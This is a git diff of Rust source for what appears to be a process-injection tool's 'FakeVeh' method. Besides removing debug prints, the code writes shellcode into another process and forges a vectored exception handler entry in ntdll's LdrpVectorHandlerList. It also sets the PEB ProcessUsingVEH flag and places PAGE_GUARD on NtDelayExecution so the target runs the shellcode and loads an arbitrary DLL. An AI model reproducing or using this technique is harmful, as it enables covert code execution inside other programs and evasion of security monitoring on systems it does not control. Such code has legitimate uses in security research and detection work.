@@ -1,44 +1,13 @@
 use std::{ffi::c_void, mem::offset_of};
 
-use windows::{Wdk::System::Threading::ProcessBasicInformation, Win32::{Foundation::EXCEPTION_GUARD_PAGE, System::{Diagnostics::Debug::EXCEPTION_CONTINUE_EXECUTION, Kernel::LIST_ENTRY, Memory::{PAGE_EXECUTE_READ, PAGE_GUARD, PAGE_READWRITE}, Threading::{PROCESS_BASIC_INFORMATION, SRWLOCK}}}};
+use windows::{Wdk::System::Threading::ProcessBasicInformation, Win32::{Foundation::EXCEPTION_GUARD_PAGE, System::{Diagnostics::Debug::EXCEPTION_CONTINUE_EXECUTION, Kernel::LIST_ENTRY, Memory::{PAGE_EXECUTE_READ, PAGE_GUARD, PAGE_READWRITE}, Threading::{PROCESS_BASIC_INFORMATION}}}};
 
 use dynasmrt::{dynasm, DynasmApi, DynasmLabelApi};
 use crate::{
     executor::ExecutionMethod,
     symbols::SymbolHandler,
-    wrappers::{AllocatedMemory, CrossProcessFlags, Module, Peb, RemoteAllocator as _, RemoteProcess}
+    wrappers::{RtlVectoredHandlerList, AllocatedMemory, CrossProcessFlags, Module, Peb, RtlVectoredExceptionEntry, RemoteAllocator as _, RemoteProcess}
 };
-
-#[repr(C)]
-#[derive(Debug)]
-struct _RTL_VECTORED_HANDLER_LIST {
-    Lock: SRWLOCK,
-    List: LIST_ENTRY
- 
-}
-
-#[repr(C)]
-#[derive(Debug)]
-struct RTL_VECTORED_EXCEPTION_ENTRY {
-    List: LIST_ENTRY,
-    pFlag: *mut usize,
-    RefCount: u32,
-    _padding: u32,
-    VectoredHandler: *const c_void, // PVECTORED_EXCEPTION_HANDLER
-    Flag: usize,
-}
-
-// FOR DEBUGGING:
-pub fn dbg_peb_is_using_veh(remote_process: &RemoteProcess) -> Result<bool, Box<dyn std::error::Error>> {
-    let pbi = remote_process.query_info::<PROCESS_BASIC_INFORMATION>(ProcessBasicInformation)?;
-    let peb: Peb = unsafe { remote_process.read_struct(pbi.PebBaseAddress as *const c_void)? };
-    let cross_flags = unsafe { peb.cross_process_flags_union.flags };
-
-    let is_using_veh = cross_flags.contains(CrossProcessFlags::PROCESS_USING_VEH);
-    println!("[*] PEB ({:?})->ProcessUsingVEH: {}", pbi.PebBaseAddress, is_using_veh);
-
-    Ok(is_using_veh)
-}
 
 pub struct FakeVeh;
 
@@ -55,32 +24,26 @@ impl ExecutionMethod for FakeVeh {
             "LdrpVectorHandlerList",
         )?;
 
-        let was_using_veh = dbg_peb_is_using_veh(remote_process)?;
+        let was_using_veh = remote_process.is_using_veh()?;
 
         // Read the VEH list head structure
-        let vectored_list: _RTL_VECTORED_HANDLER_LIST = unsafe {
+        let vectored_list: RtlVectoredHandlerList = unsafe {
             remote_process.read_struct(veh_list_addr as *const c_void)?
         };
 
         // Calculate the address of the List field within LdrpVectorHandlerList
-        let list_head_addr = veh_list_addr + offset_of!(_RTL_VECTORED_HANDLER_LIST, List);
-        
-        println!("[*] VEH List Head address: {:#x}", list_head_addr);
-        println!("[*] Initial Flink: {:#x}", vectored_list.List.Flink as usize);
-        println!("[*] Initial Blink: {:#x}", vectored_list.List.Blink as usize);
+        let list_head_addr = veh_list_addr + offset_of!(RtlVectoredHandlerList, list);
 
-        let old_first_entry_ptr = vectored_list.List.Flink;
+        let old_first_entry_ptr = vectored_list.list.Flink;
         
         let fake_veh_malloc = remote_process.alloc(
-            std::mem::size_of::<RTL_VECTORED_EXCEPTION_ENTRY>(),
+            std::mem::size_of::<RtlVectoredExceptionEntry>(),
             false
         )?;
         let fake_veh_addr: usize = fake_veh_malloc.as_ptr() as usize;
-        println!("[+] Allocated fake VEH entry at: {:#x}", fake_veh_addr);
 
-        let flag_offset = offset_of!(RTL_VECTORED_EXCEPTION_ENTRY, Flag);
+        let flag_offset = offset_of!(RtlVectoredExceptionEntry, flag);
 
-       // sc0de - shellcode (mr. i hate sc0de but i use git shortcuts like gs)
         let stub = build_shcode(
             inject_func_addr as u64,
             dll_path_mem_alloc.as_ptr() as u64,
@@ -89,33 +52,22 @@ impl ExecutionMethod for FakeVeh {
         )?;
         let shellcode_ptr = remote_process.alloc(stub.len(), true)?;
         shellcode_ptr.write(&stub)?;
-        println!("[+] Shellcode written to: {:#x}", shellcode_ptr.as_ptr() as usize);
 
         let encoded_shellcode = remote_process.encode_pointer(shellcode_ptr.as_ptr() as usize)?;
-        println!("[+] Encoded shellcode pointer: {:#x}", encoded_shellcode);
-        // end sc0de
 
-        let fake_veh = RTL_VECTORED_EXCEPTION_ENTRY {
-            List: LIST_ENTRY {
+        let fake_veh = RtlVectoredExceptionEntry {
+            list: LIST_ENTRY {
                 Flink: old_first_entry_ptr,
                 Blink: list_head_addr as *mut _,
             },
-            pFlag: (fake_veh_malloc.as_ptr() as usize + flag_offset) as *mut usize,
-            RefCount: 1,
-            _padding: 0,
-            VectoredHandler: encoded_shellcode as *const c_void,
-            Flag: 1,
+            p_flag: (fake_veh_malloc.as_ptr() as usize + flag_offset) as *mut usize,
+            ref_count: 1,
+            padding: 0,
+            vectored_handler: encoded_shellcode as *const c_void,
+            flag: 1,
         };
 
-        println!("\n[*] Fake VEH entry structure:");
-        println!("    Flink: {:#x}", fake_veh.List.Flink as usize);
-        println!("    Blink: {:#x}", fake_veh.List.Blink as usize);
-        println!("    pFlag: {:#x}", fake_veh.pFlag as usize);
-        println!("    VectoredHandler (encoded): {:#x}", fake_veh.VectoredHandler as usize);
-        println!("    Flag: {}", fake_veh.Flag);
-
         fake_veh_malloc.write_struct(&fake_veh)?;
-        println!("[+] Fake VEH entry written to target process");
         
         // we write ONLY the pointer (to a struct) value (usize), not a struct!
         let list_head_flink_addr = list_head_addr + offset_of!(LIST_ENTRY, Flink);
@@ -128,7 +80,6 @@ impl ExecutionMethod for FakeVeh {
         unsafe {
             remote_process.write_struct(list_head_flink_addr as *mut c_void, &fake_veh_addr)?;
         }
-        println!("[+] Updated list_head.Flink to point to fake VEH");
 
         // if the list is not empty (old_first_entry != list_head)
         // then update old_first_entry.Blink to point to our fake entry
@@ -149,20 +100,18 @@ impl ExecutionMethod for FakeVeh {
                     &fake_veh_addr
                 )
             }?;
-            println!("[+] Updated old first entry's Blink to point to fake VEH");
             
             // TODO: Figure out how to restore protection AFTER!!! succesful injection
             // shellcode internally unlinks our VEH before loading library so it needs to
             // be on page_readwrite during sc execution
+
             // // restore protection
             // remote_process.set_protection(
             //     old_first_blink_addr,
             //     std::mem::size_of::<usize>(),
             //     old_first_old_prot
             // )?;
-        } else {
-            println!("[*] list is empty, also updating list_head.Blink...");
-                        
+        } else {                        
             let list_head_blink_addr = (list_head_addr + offset_of!(LIST_ENTRY, Blink)) as *mut c_void;
             unsafe {
                 remote_process.write_struct(
@@ -170,22 +119,9 @@ impl ExecutionMethod for FakeVeh {
                     &fake_veh_addr
                 )
             }?;
-            println!("[+] updated list_head.Blink to point to fake VEH");
         }
 
-        // // restore protection
-        // remote_process.set_protection(
-        //     list_head_addr as *mut c_void,
-        //     std::mem::size_of::<usize>(),
-        //     list_head_old_prot
-        // )?;
-
-        println!("[+] list pwning (re-linking) done");
-
-        dbg_peb_is_using_veh(remote_process)?;
-
         if !was_using_veh {
-            println!("[*] Setting ProcessUsingVEH flag");
             let pbi = remote_process.query_info::<PROCESS_BASIC_INFORMATION>(ProcessBasicInformation)?;
             let mut peb: Peb = unsafe { remote_process.read_struct(pbi.PebBaseAddress as *const c_void)? };
 
@@ -197,27 +133,14 @@ impl ExecutionMethod for FakeVeh {
             unsafe {
                 remote_process.write_struct(cross_flags_addr, &peb.cross_process_flags_union)?;
             }
-
-            // Verify
-            let peb_verify: Peb = unsafe { remote_process.read_struct(pbi.PebBaseAddress as *const c_void)? };
-            let flags_verify = unsafe { peb_verify.cross_process_flags_union.flags };
-            println!("[+] ProcessUsingVEH flag set: {}", flags_verify.contains(CrossProcessFlags::PROCESS_USING_VEH));
         }
 
-        // trigger exec
-        println!("\n[*] triggering VEH by setting PAGE_GUARD...");
-
+        // trigger execution by exception PAGE_GUARD
         let ntdll = remote_process.get_module("ntdll.dll")?;
         let nt_delay_execution_addr = ntdll.get_func_addr("NtDelayExecution")?;
 
         let _old_nt_delay_execution_prot = remote_process.set_protection(nt_delay_execution_addr as *mut c_void, 1, PAGE_EXECUTE_READ | PAGE_GUARD)?;
-        println!("[+] PAGE_GUARD set on NtDelayExecution");
-        
-        // wait for injection
-        // println!("[*] waiting for target process to trigger VEH...");
-        // std::thread::sleep(std::time::Duration::from_secs(5));
 
-        // dbg_peb_is_using_veh(remote_process)?;
         std::mem::forget(shellcode_ptr);
         std::mem::forget(fake_veh_malloc);
 
